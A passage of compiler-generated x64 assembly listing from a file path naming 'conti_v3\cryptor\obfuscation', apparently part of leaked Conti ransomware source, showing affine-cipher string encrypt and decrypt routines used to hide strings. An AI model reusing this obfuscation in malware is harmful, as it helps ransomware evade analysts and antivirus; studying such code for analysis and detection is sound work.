  0000c	41 83 c0 03	 add	 r8d, 3
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ PROC ; MetaBuffer<11,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<11,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 78	 sub	 eax, 120		; 00000078H
  00006	44 6b c0 13	 imul	 r8d, eax, 19

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6b	 imul	 r8d, eax, 107		; 0000006bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 78	 add	 r8d, 120		; 00000078H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 61 00 00 00	 mov	 ecx, 97			; 00000061H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 43	 imul	 r8d, eax, 67		; 00000043H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 61	 add	 r8d, 97			; 00000061H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 12 00 00 00	 mov	 ecx, 18
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2a	 imul	 r8d, ecx, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 c0 06	 add	 eax, 6
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]
  0000a	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000f	41 f7 e0	 mul	 r8d
  00012	41 8b c8	 mov	 ecx, r8d
  00015	2b ca		 sub	 ecx, edx
  00017	d1 e9		 shr	 ecx, 1
  00019	03 ca		 add	 ecx, edx
  0001b	c1 e9 06	 shr	 ecx, 6
  0001e	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00021	44 2b c1	 sub	 r8d, ecx
  00024	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00028	c3		 ret	 0
?encrypt@?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
